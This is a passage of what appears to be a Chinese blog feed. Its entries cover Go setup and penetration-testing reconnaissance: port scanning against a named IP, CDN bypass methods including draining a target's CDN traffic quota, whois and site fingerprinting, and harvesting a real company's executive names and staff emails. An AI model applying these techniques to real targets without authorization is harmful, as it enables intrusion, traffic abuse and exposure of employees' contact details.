title="国内代理"></a>国内代理</h2><p><a href="https://github.com/goproxy/goproxy.cn/blob/master/README.zh-CN.md">https://github.com/goproxy/goproxy.cn/blob/master/README.zh-CN.md</a></p><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">go env -w <span class="hljs-attribute">GO111MODULE</span>=on<br>go env -w <span class="hljs-attribute">GOPROXY</span>=https://goproxy.cn,direct<br></code></pre></td></tr></table></figure><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">export</span> <span class="hljs-attribute">GO111MODULE</span>=on<br><span class="hljs-built_in">export</span> <span class="hljs-attribute">GOPROXY</span>=https://goproxy.cn<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Golang</category>
      
      <category>基础知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Golang</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Tablewriter</title>
    <link href="/2023/06/09/%E7%AC%AC%E4%B8%89%E6%96%B9%E5%BA%93/GoTablewriter/"/>
    <url>/2023/06/09/%E7%AC%AC%E4%B8%89%E6%96%B9%E5%BA%93/GoTablewriter/</url>
    
    <content type="html"><![CDATA[<h1 id="Tablewriter"><a href="#Tablewriter" class="headerlink" title="Tablewriter"></a>Tablewriter</h1><p><code>tablewriter </code>库用于在终端输出表格</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">go</span> <span class="hljs-built_in">get</span> github.<span class="hljs-keyword">com</span>/olekukonko/tablewriter<br></code></pre></td></tr></table></figure><p>简单使用：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;os&quot;</span><br><span class="hljs-string">&quot;github.com/olekukonko/tablewriter&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">// 定义表格数据</span><br>data := [][]<span class="hljs-type">string</span>&#123;<br>[]<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;John&quot;</span>, <span class="hljs-string">&quot;Doe&quot;</span>&#125;,<br>[]<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-string">&quot;Jane&quot;</span>, <span class="hljs-string">&quot;Smith&quot;</span>&#125;,<br>[]<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-string">&quot;Bob&quot;</span>, <span class="hljs-string">&quot;Johnson&quot;</span>&#125;,<br>&#125;<br><span class="hljs-comment">// 创建表格写入器</span><br>table := tablewriter.NewWriter(os.Stdout)<br><br><span class="hljs-comment">// 设置表格的列头</span><br>table.SetHeader([]<span class="hljs-type">string</span>&#123;<span class="hljs-string">&quot;ID&quot;</span>, <span class="hljs-string">&quot;First Name&quot;</span>, <span class="hljs-string">&quot;Last Name&quot;</span>&#125;)<br><br><span class="hljs-comment">// 设置表格的边框样式</span><br>table.SetBorders(tablewriter.Border&#123;Left: <span class="hljs-literal">true</span>, Top: <span class="hljs-literal">true</span>, Right: <span class="hljs-literal">true</span>, Bottom: <span class="hljs-literal">true</span>&#125;)<br><br><span class="hljs-comment">// 添加数据到表格中</span><br>table.AppendBulk(data)<br><br><span class="hljs-comment">// 渲染表格并输出到标准输出</span><br>table.Render()<br>&#125;<br><br></code></pre></td></tr></table></figure><p>边框样式：</p><ul><li><code>Left</code>：表示左边框是否显示</li><li><code>Top</code>：表示顶部边框是否显示</li><li><code>Right</code>：表示右边框是否显示</li><li><code>Bottom</code>：表示底部边框是否显示</li></ul><p>输出结果：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code">+----+</span>------------<span class="hljs-code">+-----------+</span><br><span class="hljs-section">| ID | FIRST NAME | LAST NAME |</span><br><span class="hljs-section">+----+------------+-----------+</span><br>|  1 | John       | Doe       |<br>|  2 | Jane       | Smith     |<br><span class="hljs-section">|  3 | Bob        | Johnson   |</span><br><span class="hljs-section">+----+------------+-----------+</span><br></code></pre></td></tr></table></figure><p>注意：</p><ul><li>其他类型的数据可以使用 <code>strconv</code> 包将其转换为字符串类型</li></ul>]]></content>
    
    
    <categories>
      
      <category>Golang</category>
      
      <category>第三方库</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Golang</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>端口扫描</title>
    <link href="/2023/06/09/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/"/>
    <url>/2023/06/09/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>获得 IP 资产之后，需要对其进行服务探测，知道边界部署了什么系统，开放了那些服务。</p><p>服务探测的基本流程主要分三个部分：</p><ol><li>首先探测端口是否开放</li><li>其次探测端口开放的服务类型</li><li>如果是 http 服务，则进一步判断其运行的应用系统类型、WAF 部署情况、内容接口情况等。</li></ol><h2 id="常见服务"><a href="#常见服务" class="headerlink" title="常见服务"></a>常见服务</h2><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308312101490.png" alt="image-20230831210117299"></p><h2 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308312102806.png" alt="image-20230831210205522"></p><h3 id="masscan"><a href="#masscan" class="headerlink" title="masscan"></a>masscan</h3><p><code>-p</code>：扫描端口</p><p><code>--rate</code>：扫描速率</p><p><code>-oX | -oG | -oJ</code>：XML、grepable、JSON</p><h3 id="rustScan"><a href="#rustScan" class="headerlink" title="rustScan"></a>rustScan</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">rustscan -r 1-65535 -b 1500 -t 500 -a 43.140.192.244 -- -sV -oX 43.140.192.244.xml<br></code></pre></td></tr></table></figure><ul><li><code>-r</code>：端口范围</li><li><code>-b</code>：速率</li><li><code>-t</code>：超时</li><li><code>-a</code>：目标</li><li><code>--</code>：之后是 nmap 的命令</li></ul><h2 id="工具组合"><a href="#工具组合" class="headerlink" title="工具组合"></a>工具组合</h2><p>扫开放端口，将开放端口给 nmap 进行指纹识别：</p><ul><li><p>masscan + nmap</p></li><li><p>rustscan + nmap</p></li></ul><p>注意防火墙问题，若遇到过多的开放端口，则可能是存在防火墙。</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>信息收集</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息收集</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CDN识别与绕过</title>
    <link href="/2023/06/09/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/CDN%E8%AF%86%E5%88%AB%E4%B8%8E%E7%BB%95%E8%BF%87/"/>
    <url>/2023/06/09/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/CDN%E8%AF%86%E5%88%AB%E4%B8%8E%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<h1 id="CDN识别与绕过"><a href="#CDN识别与绕过" class="headerlink" title="CDN识别与绕过"></a>CDN识别与绕过</h1><p>对于渗透测试来说，存在 CDN 的站点不是我们的目标站点，我们必须找到它的真实 IP 地址，再进行测试。</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308312106127.png" alt="image-20230831210631095"></p><h2 id="识别"><a href="#识别" class="headerlink" title="识别"></a>识别</h2><h3 id="超级-ping"><a href="#超级-ping" class="headerlink" title="超级 ping"></a>超级 ping</h3><p>不同地点访问该域名，如果不同地区解析出来的IP是不同的，那么就说明该域名存在 CDN。</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308312105590.png" alt="image-20230310002226965"></p><p>超级 ping ：</p><ul><li><a href="https://ping.chinaz.com/">https://ping.chinaz.com/</a></li><li><a href="https://ping.aizhan.com/">https://ping.aizhan.com/</a></li><li><a href="https://t.xxgeek.com/tools/ping/">https://t.xxgeek.com/tools/ping/</a></li><li><a href="https://www.wepcc.com/">https://www.wepcc.com/</a></li><li><a href="https://www.boce.com/ping/">https://www.boce.com/ping/</a></li></ul><h3 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h3><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308312105589.png" alt="image-20230310001956205"></p><h3 id="nslookup"><a href="#nslookup" class="headerlink" title="nslookup"></a>nslookup</h3><p>多个 IP：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308312105598.png" alt="image-20230310002047870"></p><h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><h3 id="配置不当"><a href="#配置不当" class="headerlink" title="配置不当"></a>配置不当</h3><p>可能只配置了 www ，其他子域名都没有配置。</p><ul><li>fumingblog.club</li><li><a href="http://www.fumingblog.club/">www.fumingblog.club</a></li><li>m.fumingblog.club</li></ul><h3 id="国外请求"><a href="#国外请求" class="headerlink" title="国外请求"></a>国外请求</h3><p>CDN加速是分区域的：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308312107338.png" alt="image-20221015211211081"></p><p>全球 DNS ：</p><ul><li><a href="http://www.ab173.com/dns/dns_world.php">http://www.ab173.com/dns/dns_world.php</a></li><li><a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a> </li><li><a href="https://dnshistory.org/">https://dnshistory.org/</a> </li><li><a href="http://whoisrequest.com/history/">http://whoisrequest.com/history/</a> </li><li><a href="https://completedns.com/dns-history/">https://completedns.com/dns-history/</a> </li><li><a href="http://dnstrails.com/">http://dnstrails.com/</a> </li><li><a href="https://who.is/domain-history/">https://who.is/domain-history/</a></li><li><a href="http://research.domaintools.com/research/hosting-history/">http://research.domaintools.com/research/hosting-history/</a> <a href="http://site.ip138.com/">http://site.ip138.com/</a> </li><li><a href="http://viewdns.info/iphistory/">http://viewdns.info/iphistory/</a> </li><li><a href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a> </li><li><a href="https://www.virustotal.com/">https://www.virustotal.com/</a> </li><li><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a> </li><li><a href="http://viewdns.info/">http://viewdns.info/</a> </li><li><a href="http://www.17ce.com/">http://www.17ce.com/</a></li><li><a href="http://toolbar.netcraft.com/site_report?url=">http://toolbar.netcraft.com/site_report?url=</a> <a href="https://securitytrails.com/">https://securitytrails.com/</a> </li><li><a href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a></li></ul><h3 id="邮件头信息"><a href="#邮件头信息" class="headerlink" title="邮件头信息"></a>邮件头信息</h3><p>邮件原文 &#x3D;&gt; 头信息 &#x3D;&gt; from</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308312107339.png" alt="image-20221015211746590"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308312107344.png" alt="image-20221015212120108"></p><h3 id="DNS历史解析"><a href="#DNS历史解析" class="headerlink" title="DNS历史解析"></a>DNS历史解析</h3><ul><li><a href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a> </li><li><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a> </li><li><a href="http://viewdns.info/">http://viewdns.info/</a></li></ul><h3 id="第三方工具"><a href="#第三方工具" class="headerlink" title="第三方工具"></a>第三方工具</h3><ul><li><a href="https://get-site-ip.com/">https://get-site-ip.com/</a></li><li>Censys：<a href="https://search.censys.io/">https://search.censys.io/</a></li><li><a href="https://github.com/superfish9/hackcdn">https://github.com/superfish9/hackcdn</a></li><li><a href="https://github.com/boy-hack/w8fuckcdn">https://github.com/boy-hack/w8fuckcdn</a></li></ul><h3 id="ico空间搜索"><a href="#ico空间搜索" class="headerlink" title="ico空间搜索"></a>ico空间搜索</h3><p>网站源码中下载ico图标，放到fofa中搜索即可。</p><h3 id="敏感文件"><a href="#敏感文件" class="headerlink" title="敏感文件"></a>敏感文件</h3><ul><li>文件探针</li><li>phpinfo</li><li>网站源代码</li><li>信息泄露</li><li>GitHub信息泄露</li><li>js文件</li></ul><h3 id="F5-LTM解码法"><a href="#F5-LTM解码法" class="headerlink" title="F5 LTM解码法"></a>F5 LTM解码法</h3><p>当服务器使用F5 LTM做负载均衡时，通过对set-cookie关键字的解码真实ip也可被获取，</p><p>例如：<code>Set-Cookie: BIGipServerpool_8.29_8030=487098378.24095.0000</code></p><ol><li>先把第一小节的十进制数即<code>487098378</code>取出来</li><li>然后将其转为十六进制数<code>1d08880a</code></li><li>接着从后至前，以此取四位数出来，也就是<code>0a.88.08.1d</code>，</li><li>最后依次把他们转为十进制数 <code>10.136.8.29</code>，也就是最后的真实ip。</li></ol><h3 id="流量攻击"><a href="#流量攻击" class="headerlink" title="流量攻击"></a>流量攻击</h3><p>CDN一般是按流量计费获取购买流量包，当流量包被消耗完之后，即可获取真实 IP。</p>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>信息收集</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息收集</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>域名信息</title>
    <link href="/2023/06/09/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF/"/>
    <url>/2023/06/09/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%9F%9F%E5%90%8D%E4%BF%A1%E6%81%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="域名信息"><a href="#域名信息" class="headerlink" title="域名信息"></a>域名信息</h1><p>一个域名本身就带有很多信息：</p><ul><li><code>whois</code></li><li>备案信息</li></ul><h2 id="whois"><a href="#whois" class="headerlink" title="whois"></a>whois</h2><p><code>whois</code> 可以用来查询域名是否已经被注册，以及注册域名的详细信息的数据库（如域名所有人、域名注册商、域名注册日期和过期日期等）。通过域名Whois服务器查询，可以查询域名归属者联系方式，以及注册和到期时间等等。</p><p>还可以通过 <code>whois</code> 反查，获取当前域名所有人、联系人名下的其他域名，扩大资产。</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308312050943.png" alt="image-20230831205021793"></p><p><code>whois</code> 查询网站：</p><ul><li><p>站长之家：<a href="http://whois.chinaz.com/">http://whois.chinaz.com/</a></p></li><li><p>爱站网：<a href="https://whois.aizhan.com/">https://whois.aizhan.com/</a></p></li><li><p>腾讯云：<a href="https://whois.cloud.tencent.com/">https://whois.cloud.tencent.com/</a></p></li><li><p>美橙互联：<a href="https://whois.cndns.com/">https://whois.cndns.com/</a></p></li><li><p>爱名网：<a href="https://www.22.cn/domain/">https://www.22.cn/domain/</a></p></li><li><p>易名网：<a href="https://whois.ename.net/">https://whois.ename.net/</a></p></li><li><p>中国万网：<a href="https://whois.aliyun.com/">https://whois.aliyun.com/</a></p></li><li><p>西部数码：<a href="https://whois.west.cn/">https://whois.west.cn/</a></p></li><li><p>新网：<a href="http://whois.xinnet.com/domain/whois/index.jsp">http://whois.xinnet.com/domain/whois/index.jsp</a></p></li><li><p>纳网：<a href="http://whois.nawang.cn/">http://whois.nawang.cn/</a></p></li><li><p>中资源：<a href="https://www.zzy.cn/domain/whois.html">https://www.zzy.cn/domain/whois.html</a></p></li><li><p>三五互联：<a href="https://cp.35.com/chinese/whois.php">https://cp.35.com/chinese/whois.php</a></p></li><li><p>新网互联：<a href="http://www.dns.com.cn/show/domain/whois/index.do">http://www.dns.com.cn/show/domain/whois/index.do</a></p></li><li><p>国外：<a href="https://who.is/">https://who.is/</a></p></li></ul><h2 id="备案信息"><a href="#备案信息" class="headerlink" title="备案信息"></a>备案信息</h2><p>目前在国内注册域名都必须要进行备案，否则是无法解析的。</p><p>备案信息包括单位名称、备案编号、网站负责人、电子邮箱、联系电话、法人等。</p><p>同样可以利用备案信息进行反查，可以获取该企业下的所有域名资产。通常一个企业的备案号只有一个，其他都是类似 [备案号-编号] 的形式。</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202308312055445.png" alt="image-20230831205510308"></p><p>备案查询网站：</p><ul><li>天眼查：<a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a></li><li>ICP备案查询网：<a href="https://www.beianx.cn/">https://www.beianx.cn/</a></li><li>爱站备案查询：<a href="https://icp.aizhan.com/">https://icp.aizhan.com/</a></li><li>域名助手备案信息查询：<a href="http://cha.fute.com/index">http://cha.fute.com/index</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>信息收集</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息收集</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>站点信息</title>
    <link href="/2023/06/09/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E7%AB%99%E7%82%B9%E4%BF%A1%E6%81%AF/"/>
    <url>/2023/06/09/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E7%AB%99%E7%82%B9%E4%BF%A1%E6%81%AF/</url>
    
    <content type="html"><![CDATA[<h1 id="站点信息"><a href="#站点信息" class="headerlink" title="站点信息"></a>站点信息</h1><p>站点信息收集：</p><ul><li>去重验活</li><li>指纹识别</li><li>WAF识别</li><li>目录扫描</li></ul><h2 id="去重验活"><a href="#去重验活" class="headerlink" title="去重验活"></a>去重验活</h2><p>获取大量 URL 后，需要找出存活的站点，这里可以通过 <code>httpx</code> 工具去对 URL 验活。</p><p>项目地址：<a href="https://github.com/projectdiscovery/httpx">https://github.com/projectdiscovery/httpx</a></p><p>常用命令：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">httpx</span> -u url -mc <span class="hljs-number">200</span>,<span class="hljs-number">302</span> -title -nc -hash md5 -sc -server -ip -location<br></code></pre></td></tr></table></figure><p>参数介绍：</p><ul><li><code>-u</code>：指定目标</li><li><code>-sc</code>：状态码</li><li><code>-mc</code> ：现在状态码</li><li><code>-title</code>：标题</li><li><code>-nc</code>：取消彩色打印</li><li><code>-hash md5</code>：hash 值</li></ul><h2 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h2><p>通过指纹识别，确定目标的 CMS 或框架组件信息，再寻找是否存在公开的漏洞，找找官网的演示网站，测试是否存在可利用的漏洞也可以去找源码进行代码审计。</p><p>指纹识别工具：</p><ul><li><a href="http://www.yunsee.cn/info.html">http://www.yunsee.cn/info.html</a></li><li><a href="http://finger.tidesec.net/">http://finger.tidesec.net/</a></li><li><a href="https://github.com/urbanadventurer/WhatWeb">https://github.com/urbanadventurer/WhatWeb</a></li><li><a href="https://github.com/TideSec/TideFinger">https://github.com/TideSec/TideFinger</a></li><li><a href="https://github.com/EdgeSecurityTeam/EHole">https://github.com/EdgeSecurityTeam/EHole</a></li><li><a href="https://github.com/Funsiooo/chunsou/">https://github.com/Funsiooo/chunsou/</a></li></ul><h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><p>通过目录扫描可以获取后台目录、敏感文件等信息。</p><p>目录扫描工具：</p><ul><li><a href="https://github.com/OJ/gobuster">https://github.com/OJ/gobuster</a></li><li><a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a></li><li><a href="https://www.fujieace.com/hacker/tools/yujian.html">https://www.fujieace.com/hacker/tools/yujian.html</a></li><li><a href="https://github.com/7kbstorm/7kbscan-WebPathBrute">https://github.com/7kbstorm/7kbscan-WebPathBrute</a></li></ul><h2 id="WAF识别"><a href="#WAF识别" class="headerlink" title="WAF识别"></a>WAF识别</h2><p>当目标存在 WAF 时，需要注意扫描器、爆破工具的使用，且在手工挖掘漏洞时，还需要注意 WAF 的影响。</p><ul><li><a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
      <category>信息收集</category>
      
    </categories>
    
    
    <tags>
      
      <tag>信息收集</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>企业资产</title>
    <link href="/2023/06/08/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E4%BC%81%E4%B8%9A%E8%B5%84%E4%BA%A7/"/>
    <url>/2023/06/08/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E4%BC%81%E4%B8%9A%E8%B5%84%E4%BA%A7/</url>
    
    <content type="html"><![CDATA[<h1 id="企业资产"><a href="#企业资产" class="headerlink" title="企业资产"></a>企业资产</h1><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051209497.png" alt="企业资产"></p><h2 id="组织架构"><a href="#组织架构" class="headerlink" title="组织架构"></a>组织架构</h2><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051209500.png" alt="image-20221013105606873"></p><ul><li><strong>董事长</strong>：公司或集团的最高负责人，股东利益的最高代表，统领董事会。CEO的权力都来源于他，只有他拥有召开董事会、罢免CEO等最高权力</li><li><strong>CEO</strong>：首席执行官（Chief Executive Officer）是在一个企业中负责日常经营管理的最高级管理人员，又称作行政总裁</li><li><strong>CFO</strong>：财务总监(Chief Financial Officer)，指公司首席财政官或财务总监，是现代公司中最重要、最有价值的顶尖管理职位之一</li><li><strong>CMO</strong>：首席营销官（Chief Marketing Officer）是指企业中负责市场运营工作的高级管理人员，又称作市场部经理、营销总监。</li><li><strong>COO</strong>：首席运营官（英语：Chief Operating Officer，英文缩写：COO，又常称为运营官、营运总监）是公司团体里负责监督管理每日活动的高阶官员</li><li><strong>CTO</strong>：首席技术官（Chief Technology Officer），即企业内负责技术的最高负责人。对于我们做技术的同学来说，大老板就是CTO，负责公司的整个技术层面的事儿，也是掌握公司对外服务器、域名、IP 等资产的人。</li></ul><h2 id="收集方式"><a href="#收集方式" class="headerlink" title="收集方式"></a>收集方式</h2><h3 id="第三方查询网站"><a href="#第三方查询网站" class="headerlink" title="第三方查询网站"></a>第三方查询网站</h3><p>爱企查：<a href="https://aiqicha.baidu.com/">https://aiqicha.baidu.com/</a></p><p>天眼查：<a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a></p><p>企查查：<a href="https://www.qcc.com/">https://www.qcc.com/</a></p><p>以百度为例，使用企查查对其进行信息收集：</p><ul><li><strong>官网</strong>：<a href="http://www.baidu.com/">http://www.baidu.com</a></li><li><strong>地址</strong>：北京市海淀区上地十街10号百度大厦三层</li><li><strong>电话</strong>：010-59928888</li><li><strong>邮箱</strong>：<a href="mailto:&#119;&#97;&#110;&#x67;&#119;&#x65;&#105;&#55;&#x35;&#64;&#98;&#97;&#x69;&#x64;&#117;&#46;&#x63;&#111;&#x6d;">&#119;&#97;&#110;&#x67;&#119;&#x65;&#105;&#55;&#x35;&#64;&#98;&#97;&#x69;&#x64;&#117;&#46;&#x63;&#111;&#x6d;</a>、<a href="mailto:&#x77;&#117;&#114;&#x6f;&#110;&#103;&#x71;&#x69;&#x61;&#x6e;&#x40;&#x62;&#97;&#x69;&#100;&#x75;&#46;&#99;&#111;&#109;">&#x77;&#117;&#114;&#x6f;&#110;&#103;&#x71;&#x69;&#x61;&#x6e;&#x40;&#x62;&#97;&#x69;&#100;&#x75;&#46;&#99;&#111;&#109;</a>、<a href="mailto:&#115;&#x75;&#x6e;&#99;&#104;&#101;&#x6e;&#64;&#115;&#x75;&#x7a;&#46;&#98;&#x61;&#x69;&#100;&#117;&#46;&#99;&#111;&#x6d;">&#115;&#x75;&#x6e;&#99;&#104;&#101;&#x6e;&#64;&#115;&#x75;&#x7a;&#46;&#98;&#x61;&#x69;&#100;&#117;&#46;&#99;&#111;&#x6d;</a>…..</li><li><strong>所属行业</strong>： 互联网和相关服务</li><li><strong>企业业务范围</strong>：开发、生产计算机软件….销售第三类医疗器械</li><li><strong>三方合作公司</strong>：对外投资、分支机构、控制企业、受投资信息、各种地区分公司</li></ul><h3 id="网页信息"><a href="#网页信息" class="headerlink" title="网页信息"></a>网页信息</h3><p>在企业官网中，通常会有关于页面，其中就包含着许多信息。</p><p>百度官网：<a href="http://www.baidu.com/">http://www.baidu.com</a></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051209491.png" alt="image-20221013114535646"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051209512.png" alt="image-20221013114637371"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051209544.png" alt="image-20221013115242216"></p><p>组织架构信息整理：</p><ul><li>董事长、CEO：李彦宏</li><li>首席财务官（CFO）：罗戎</li><li>首席技术官（CTO）：王海峰</li><li>执行副总裁：沈抖</li><li>首席战略官（CSO）：余正钧</li><li>资深副总裁：梁志祥、崔珊珊、李震宇</li></ul><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051209533.png" alt="image-20221013115426509"></p><p>联系信息：</p><ul><li>总机：(+86 10)5992 8888</li><li>传真：(+86 10)5992 0000</li><li>400-921-9999</li><li>400-800-8888</li><li><a href="mailto:&#x75;&#112;&#x6d;&#99;&#111;&#x40;&#x62;&#x61;&#105;&#x64;&#117;&#x2e;&#x63;&#111;&#x6d;">&#x75;&#112;&#x6d;&#99;&#111;&#x40;&#x62;&#x61;&#105;&#x64;&#117;&#x2e;&#x63;&#111;&#x6d;</a></li><li><a href="mailto:&#99;&#x61;&#109;&#112;&#117;&#115;&#x6d;&#x61;&#115;&#116;&#101;&#114;&#64;&#98;&#x61;&#105;&#100;&#x75;&#x2e;&#x63;&#111;&#109;">&#99;&#x61;&#109;&#112;&#117;&#115;&#x6d;&#x61;&#115;&#116;&#101;&#114;&#64;&#98;&#x61;&#105;&#100;&#x75;&#x2e;&#x63;&#111;&#109;</a></li><li><a href="mailto:&#122;&#104;&#97;&#110;&#122;&#104;&#97;&#110;&#103;&#112;&#x69;&#x6e;&#x67;&#116;&#x61;&#105;&#x40;&#98;&#x61;&#x69;&#x64;&#x75;&#46;&#x63;&#x6f;&#109;">&#122;&#104;&#97;&#110;&#122;&#104;&#97;&#110;&#103;&#112;&#x69;&#x6e;&#x67;&#116;&#x61;&#105;&#x40;&#98;&#x61;&#x69;&#x64;&#x75;&#46;&#x63;&#x6f;&#109;</a></li><li><a href="mailto:&#109;&#98;&#97;&#105;&#x64;&#x75;&#64;&#x62;&#x61;&#x69;&#100;&#117;&#46;&#x63;&#x6f;&#109;">&#109;&#98;&#97;&#105;&#x64;&#x75;&#64;&#x62;&#x61;&#x69;&#100;&#117;&#46;&#x63;&#x6f;&#109;</a></li><li><a href="mailto:&#x62;&#100;&#106;&#x62;&#64;&#98;&#x61;&#105;&#x64;&#117;&#x2e;&#99;&#111;&#109;">&#x62;&#100;&#106;&#x62;&#64;&#98;&#x61;&#105;&#x64;&#117;&#x2e;&#99;&#111;&#109;</a></li></ul><h3 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h3><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051209197.png" alt="image-20221013134945130"></p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/202309051209906.png" alt="image-20221013135002538"></p><p>邮箱信息：</p><ul><li><a href="mailto:&#x7a;&#104;&#x75;&#x77;&#101;&#x6e;&#120;&#x75;&#x61;&#110;&#64;&#98;&#97;&#x69;&#x64;&#117;&#x2e;&#x63;&#x6f;&#109;">&#x7a;&#104;&#x75;&#x77;&#101;&#x6e;&#120;&#x75;&#x61;&#110;&#64;&#98;&#97;&#x69;&#x64;&#117;&#x2e;&#x63;&#x6f;&#109;</a></li><li><a 